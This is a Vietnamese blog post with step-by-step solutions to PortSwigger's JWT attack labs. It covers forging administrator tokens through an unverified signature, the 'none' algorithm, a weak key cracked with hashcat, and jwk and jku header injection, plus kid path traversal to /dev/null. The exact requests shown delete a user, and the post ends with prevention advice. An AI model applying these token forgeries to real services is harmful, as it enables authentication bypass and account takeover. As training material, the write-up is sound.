---
title: "[PortSwigger Lab] - JWT Attacks"
description: Solution of JWT Attacks Lab
date: 2025-06-18 21:30:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, jwt attack]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-17-portswigger-lab-jwt-attacks/jwt-attacks.png
    alt: JWT Attacks
---

## Introduction
---
### **JSON Web Token (JWT)**
**JSON Web Token (JWT)** là một định dạng chuẩn để truyền dữ liệu **JSON** đã được ký số giữa các hệ thống. Nó thường được dùng để **xác thực người dùng**, **quản lý phiên (session)**, và **kiểm soát truy cập** trong các hệ thống phân tán.
Điểm đặc biệt là:
- Dữ liệu được chứa ngay trong **token**, do đó không cần lưu trạng thái **(stateless)** ở phía **server** như cách dùng **session** truyền thống.
- **Token** được ký **(signed)** để đảm bảo tính toàn vẹn — nghĩa là nếu ai đó sửa **token**, chữ ký sẽ không khớp nữa và **token** sẽ bị từ chối.

Cấu trúc JWT gồm 3 phần chính:
- **Header (Tiêu đề)**: chứa thông tin về thuật toán ký (như `HS256`, `RS256`…)
- **Payload (Nội dung)**: chứa các **"claims"** — dữ liệu như tên người dùng, quyền hạn, email, thời gian hết hạn, v.v.
- **Signature (Chữ ký)**: dùng để xác minh rằng **token** chưa bị chỉnh sửa và được phát hành từ một nguồn đáng tin.

**JWT** vs **JWS** vs **JWE**
- **JWT**: là định dạng tổng quát (JSON Web Token)
- **JWS (JSON Web Signature)**: **JWT** có chữ ký (phổ biến nhất)
- **JWE (JSON Web Encryption)**: **JWT** được mã hóa (ít gặp hơn)

Ví dụ:
- Payload:

```json
{
  "username": "carlos",
  "isAdmin": false
}
```
- Header:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

- **Bước 1:** Base64Url encode

```python
header_encoded  = base64url_encode(header)
payload_encoded = base64url_encode(payload)
```
- **Bước 2:** Tạo chuỗi để ký

```python
data_to_sign = header_encoded + "." + payload_encoded
```
- **Bước 3:** Tạo chữ ký với secret:

```python
import hmac
import hashlib
import base64

signature = base64url_encode(
    hmac.new(
        b"super_secret_key",
        msg=data_to_sign.encode(),
        digestmod=hashlib.sha256
    ).digest()
)
```
- **Bước 4:** Nối lại thành token

```python
JWT = header_encoded + "." + payload_encoded + "." + signature
```

### **JWT Attacks**
**JWT attacks** là những hành vi khai thác lỗ hổng trong cách ứng dụng xử lý **JWT** nhằm đạt mục tiêu xấu – thường là để:
- Giả mạo danh tính người dùng khác
- Vượt qua xác thực
- Leo thang đặc quyền **(privilege escalation)**

## Solve JWT Attacks Lab
---
> **To solve all lab:** install **JWT Editor** from **BApp**
{: .prompt-info}

- [JWT Secrets List](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list)

### Lab: JWT authentication bypass via unverified signature
- Login bằng account `wiener`
- Gửi request đến đến **Repeater**
- Chọn tab **JSON Web Token** (Nhớ cài **JWT Editor**)
- Sửa `sub` trong **payload** lại thành 

```json
{
    "iss": "portswigger",
    "exp": 1750270419,
    "sub": "administrator"
}
```
- **Server** không xác minh chữ ký, hoặc chỉ `decode()` mà không `verify()` **JWT**.
- Chọn tab **Pretty**, sửa đổi **path** thành `/admin`

```http
GET /admin HTTP/2
Host: 0aae0008036538f882e743a8004d002b.web-security-academy.net
```
- Quan sát **response** ta thấy **path** để xóa user `carlos`

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0aae0008036538f882e743a8004d002b.web-security-academy.net
```
- Ngoài ra có thể thay đổi **cookie** trên trình duyệt để xóa
    - Copy nội dung **cookie** ở phần **Serialized JWT**
    - Mở **Devtool** của trình duyệt > **Application** > **Cookie**, thay đổi giá trị **cookie** của trang web hiện tại bằng nội dung đã copy
    - Có thể sử dụng **Cookie Editor Extension** để sửa

### Lab: JWT authentication bypass via flawed signature verification
- Login bằng account `wiener`
- Gửi request đến đến **Repeater**
- Chọn tab **JSON Web Token** (Nhớ cài **JWT Editor**)
- Sửa `sub` trong **payload** lại thành 

```json
{
    "iss": "portswigger",
    "exp": 1750270419,
    "sub": "administrator"
}
```
- Click **Attack** ở góc trái bên dưới, chọn `"none" Signing Algorithm` và `OK`

- **Server** không xác minh chữ ký, hoặc chỉ `decode()` mà không `verify()` **JWT**.
- Chọn tab **Pretty**, sửa đổi **path** thành `/admin`

```http
GET /admin HTTP/2
Host: 0a5d00030422b0d280d4d0b500a60082.web-security-academy.net
```
- Quan sát **response** ta thấy **path** để xóa user `carlos`

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a5d00030422b0d280d4d0b500a60082.web-security-academy.net
```
- Ngoài ra có thể thay đổi **cookie** trên trình duyệt để xóa
    - Copy nội dung **cookie** ở phần **Serialized JWT**
    - Mở **Devtool** của trình duyệt > **Application** > **Cookie**, thay đổi giá trị **cookie** của trang web hiện tại bằng nội dung đã copy
    - Có thể sử dụng **Cookie Editor Extension** để sửa

### Lab: JWT authentication bypass via weak signing key
#### Analysis
- Login bằng account `wiener`
- Gửi request đến đến **Repeater**
- Thử truy cập `/admin` => từ chối
- Sử dụng [**hashcat**](https://hashcat.net/hashcat/) để **brute-force** => ký lại để trở thành `administrator`
#### Exploit
- Copy nội dung **cookie** ở phần **Serialized JWT**
- Tải file [JWT Secrets List](https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list) về 
- Sử dụng **hashcat** để **brute-force**

```zsh
hashcat -a 0 -m 16500 eyJraWQiOiJmYzNlOWNmYy03Y2Y2LTQzMTAtYTdkZS03NmE5NGVkZDAxMzkiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1MDMwNjYyNiwic3ViIjoid2llbmVyIn0.Smp7bOpvCnzI71JpvGqmz9L5rH7R2-0gdxYRM4WG3iA jwt.secrets.list
```
- Ta nhận được **secret** là `secret1`, sử dụng nó để ký lại
- Chọn tab **Pretty**, sửa đổi **path** thành `/admin`

```http
GET /admin HTTP/2
Host: 0a5d00030422b0d280d4d0b500a60082.web-security-academy.net
```
- Tạo **signature** mới:
    - Chọn tab **JWT Editor**
    - **New Symmetric Key** > **Specify secret** 
    - Nhập **key** tìm được và **Genarate** > **Ok**
- Chọn tab **JSON Web Token** (Nhớ cài **JWT Editor**), đổi giá trị của `sub` thành `administrator`

```json
{
    "iss": "portswigger",
    "exp": 1750306626,
    "sub": "administrator"
}
```
- Click **Sign** > chọn **Signning Key** vừa tạo > **Ok** 
- Quan sát **response** ta thấy **path** để xóa user `carlos`

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a5d00030422b0d280d4d0b500a60082.web-security-academy.net
```
- Ngoài ra có thể thay đổi **cookie** trên trình duyệt để xóa
    - Copy nội dung **cookie** ở phần **Serialized JWT**
    - Mở **Devtool** của trình duyệt > **Application** > **Cookie**, thay đổi giá trị **cookie** của trang web hiện tại bằng nội dung đã copy
    - Có thể sử dụng **Cookie Editor Extension** để sửa

### Lab: JWT authentication bypass via jwk header injection
- Login bằng account `wiener`
- Gửi request đến đến **Repeater**
- Thử truy cập `/admin` => từ chối

```http
GET /admin HTTP/2
Host: 0a5d00030422b0d280d4d0b500a60082.web-security-academy.net
```
- Tạo **JSON Web Key**
    - **JWT Editor** > **New RSA Key**
    - **Format: JWK** > **Genarate**
- Tại request được gửi đến **repeater**, chọn tab **JSON Web Token**
- Đổi giá trị của `sub` thành `administrator`

```json
{
    "iss": "portswigger",
    "exp": 1750318507,
    "sub": "administrator"
}
```
- Click **Attack** > **Embedded JWK** > Chọn **JWK** vừa tạo > **Ok**
- **Send** và quan sát **response** ta thấy **path** để xóa user `carlos`

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a5d00030422b0d280d4d0b500a60082.web-security-academy.net
```
- Ngoài ra có thể thay đổi **cookie** trên trình duyệt để xóa
    - Copy nội dung **cookie** ở phần **Serialized JWT**
    - Mở **Devtool** của trình duyệt > **Application** > **Cookie**, thay đổi giá trị **cookie** của trang web hiện tại bằng nội dung đã copy
    - Có thể sử dụng **Cookie Editor Extension** để sửa

### Lab: JWT authentication bypass via jku header injection
#### Exploit
- Login bằng account `wiener`
- Gửi request đến đến **Repeater**
- Thử truy cập `/admin` => từ chối

```http
GET /admin HTTP/2
Host: 0a5d00030422b0d280d4d0b500a60082.web-security-academy.net
```
- Tạo **JSON Web Key**
    - **JWT Editor** > **New RSA Key**
    - **Format: JWK** > **Genarate**
- Tạo **json file** lưu trên **exploit server**
    - Đến **exploit server** > đổi **path** đến **file** thành `/xxnx.json`
    - Đổi `Content-Type: application/json; charset=utf-8`
    - Tạo khóa `keys` và dán key vừa **copy** làm **value** cho `keys`

```json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "985f339f-1230-4c71-b2ce-edcf5284bc09",
      "n": "4uNFrzM2rtJkFnZ3HLs1jlugSYf-7Gl0zRbvO0lVTS6wTLDeB0doZbh9fknTbPR3P8HaXNtpjEyXy2xvibTilKmD3zl4v6g83MYkXxI9DVOFknEawM4AXTajOaFSZm9ePUXo9jTme3RYtAGV5hh7oftuQNZLlueNuV5nIa6uG4AkuRDgwO6H8G_DLDiEvoZy2_CcptB4vY1nyUlXO0YgxB2PW7L0riKxoPfnboExQC9UZh1xqhxRqVWnS4B_jcWEoBTLy0LmB_XkSTdOFQnMqUJ-LqWo4J6rcn84c_jVQX8KNOqMzH3GZoM7tcfk5ayOsy0wQgRcB4aitD3nvH1JRw",
      "e": "AQAB",
      "d": "I3zTiXPD5H7uk2o0IepQ633-tCxGqJ5WBpNvwnYrQXHsDBLIp5rOWXAMhj7wiDo0l2RazetZDE4ZRVgl71lmQe_Bu0iMpRhLbLy73k2b_wRGqtZwuMzVLGnqCI7oXzKhgDP5xt4Urs_5OoPaTlhwqLALBAPWDuRo5nWS6_xxKcZgkbYheqIefcQiAxivUGPwygqe1R0cT5cKeyafD_7TtocW8HMLuPwkRsLK0fhR8cNzsZbOGptqlcfFPFFzNfxlF6Qb8IP__yro9R0bGkA3EfCl2sLtVklya6XKKG9Zd3F5mpgoMrfZVsRxUAJdOIMiTTIQaoy8LgqPdS7Zev1SAQ",
      "p": "9Gha379Fx9rJqXMqK5nl1peC0crdFj-Ogs_ds6zJjxx50VmzFt-myJpKCUT2pDVOWmF0wo6Sj-k0f6C-VDbry0VsWASnKySXW35McH7uuiRqWuPqSVo8og2OViQo2EfOt4Up29mb6_ocQJjWU7vnfpsXqBIaG84p71jr6IpFw68",
      "q": "7aYwEE4F5FD88up4cbDMzTM6bJBlw2gzhWtGOPgHiBB12nTUimSH91avj1NJMBZU_GxJ220U8t6SfqyW5I930NQrBtcgPvAmY8OS0YxdxRQ8PRz1xsl6D4b3iC7xPUWaUdoyotMuRa39Sfx8SrKvWTWtbvb6mVQZXdop8EyNgek",
      "dp": "zJMsvWwUtJxlf_htq-E9iMl5LrFnLWA1oTjskaBndeqX7KvwQ40gxXifz_JxoDEeTHiWiuNbuimxT8L0jPkLlTGe5m2-n1YZevPUd7VHjXc9rqZnTM7DQcGnCmNp7N7uIJ7N0r_qyzKmw0sq2xvFQSwAOSYtxGhkoXsEu7hBfPE",
      "dq": "TNMGgp7WZMKRou2NViNzcXp4DpR3cT4EOcM-BjiYJrI7hw1xj_ODyL9rLYgdBsCRZLCVB6wxs3mkHfMpLGX8s7OC3Uk6EV6M6n9UvQ0FWyp5dsAf681B-jcFWi7iqY4QnxlMeTqPoNLoKLzIaVVuPgaONGr_BAYd1Ssrl5UHwdE",
      "qi": "YdQPuVio6vO_lpAKBY_aw34nKZhrDrhaMjpDRIvfDP8elkTWYOqJ3vLeo1nDutlgdRpuEFPGNiEO677nIkBk9aYJTYX0uVbpX6uIUpPNp0c-ltQzTRL9B1iTO8LEOIwKxbMkS_ST6CVyFSGKKzz1N5vhMGZ_-fXZXA6xSGsJTZM"
    }
  ]
}
```
- Đến **Repeater** > **JSON Web Token**
- Thêm **JSON Web Key set URL (JKU)** vào **header JWT**, sửa `kid` thành `kid` của **key** vừa tạo

```json
{
    "jku": "https://exploit-0a95000e039a6e9081bbec87017d0091.exploit-server.net/xnxx.json",
    "kid": "985f339f-1230-4c71-b2ce-edcf5284bc09",
    "alg": "RS256"
}
```
- Đổi giá trị của `sub` thành `administrator`

```json
{
    "iss": "portswigger",
    "exp": 1750318507,
    "sub": "administrator"
}
```
- Click **Sign** > chọn **key** vừa tạo để ký lại 
- Gửi **request** đến `/admin` và quan sát **response** ta thấy **path** để xóa user `carlos`

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a5d00030422b0d280d4d0b500a60082.web-security-academy.net
```
- Ngoài ra có thể thay đổi **cookie** trên trình duyệt để xóa
    - Copy nội dung **cookie** ở phần **Serialized JWT**
    - Mở **Devtool** của trình duyệt > **Application** > **Cookie**, thay đổi giá trị **cookie** của trang web hiện tại bằng nội dung đã copy
    - Có thể sử dụng **Cookie Editor Extension** để sửa

#### Explain
- Cốt lõi của việc này là **Server fetch jku**, lấy **JWK Set** từ **exploit server**.
- Thấy `kid` khớp => lấy **public key** đã **upload**.
- Xác thực chữ ký: hợp lệ (vì đã tự ký bằng **private key**).
- Xác thực thành công nên trở thành **admin**
- **JWK** phải đặt trong **keys** bởi vì đó là chuẩn, dựa vào `kid` để xác định **key**

### Lab: JWT authentication bypass via kid header path traversal
#### Exploit
- Login bằng account `wiener`
- Gửi request đến đến **Repeater**
- Thử truy cập `/admin` => từ chối

```http
GET /admin HTTP/2
Host: 0a5d00030422b0d280d4d
```
- Tạo **Symmetric key**:
    - **JWT Editor** > **New Symmetric Key** > **Random secret** > **Genarate**
    - Sửa `"k"` thành `"AA=="` **(null byte)** vì **Burp** không cho dùng **secret** là chuỗi rỗng `""`, nên dùng **null byte** `\x00` thay thế.
    - **OK**

```json
{
    "kty": "oct",
    "kid": "ce8f3439-30d8-4c15-b5d6-63f15650d0d4",
    "k": "AA=="
}
```
- Sửa **JWT** và ký lại
    - Quay lại request `/admin` trong **Repeater**
    - Chuyển sang tab **JSON Web Token**
    - Trong **JWT header**

    ```json
{
    "kid": "../../../../../dev/null",
    "alg": "HS256"
}
    ```
    - Trong **JWT payload**

    ```json
{
    "iss": "portswigger",
    "exp": 1750346004,
    "sub": "administrator"
}
    ```

- Click **"Sign"** >  chọn key đã tạo 
- Click **OK** và gửi **request**
- Quan sát **response** ta thấy **path** để xóa user `carlos`

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a5d00030422b0d280d4d0b500a60082.web-security-academy.net
```
- Ngoài ra có thể thay đổi **cookie** trên trình duyệt để xóa
    - Copy nội dung **cookie** ở phần **Serialized JWT**
    - Mở **Devtool** của trình duyệt > **Application** > **Cookie**, thay đổi giá trị **cookie** của trang web hiện tại bằng nội dung đã copy
    - Có thể sử dụng **Cookie Editor Extension** để sửa

#### Explain
- Server nhận **JWT**:
    - **kid** trỏ đến `/dev/null`
    - **Secret** khi **verify** = `""`

- Bạn đã ký **JWT** bằng `\x00` → tương đương gần đúng với `""`
- Server tin rằng **JWT hợp lệ**
- Payload có sub = **administrator** → bạn được coi là **admin**

## Prevent
--- 
1. Dùng thư viện **JWT** cập nhật & hiểu rõ cách hoạt động
    - Sử dụng các thư viện chính thống như:
        **Python:** `PyJWT`, `Authlib`
        **Node.js:** `jsonwebtoken`
        **Java:** `jjwt`, `nimbus-jose-jwt`
    - Hiểu kỹ cách chúng **verify** chữ ký, xử lý `alg`, `jku`, `kid`, `...`
2. **Verify** chữ ký kỹ càng (đúng alg, đúng khóa)
    - Không chỉ kiểm tra chữ ký có hợp lệ mà còn phải:
        - Kiểm tra **alg** có đúng loại được cho phép (ví dụ: chỉ chấp nhận RS256)
        - Không cho phép **JWT** từ **client override alg**
        - Không cho phép **alg: none**
3. **Whitelist domain** được phép trong `jku`
    - `jku` là **URL** tới **JWK Set (public key)**.
    - Nếu không kiểm soát kỹ, **attacker** có thể dùng `jku` trỏ đến **server** độc hại, chứa **public key giả mạo**, ký token giả.
    - Chỉ cho phép `jku` từ các **domain đáng tin**
4. Không để **kid** bị tấn công **traversal / SQLi**
    - `kid` là `"key ID"` dùng để chọn **key verify**.
    - Nếu **server**:
        - Truy vấn **DB** theo `kid` => có thể bị **SQL Injection**
        - Đọc **file** từ `kid` => có thể bị **path traversal**
    - Sử dụng **prepared statements** nếu lấy từ **DB**
    - Không bao giờ dùng `kid` để đọc file hệ thống trực tiếp
    - Kiểm tra định dạng `kid` trước khi sử dụng

---
Goodluck! 🍀🍀🍀 


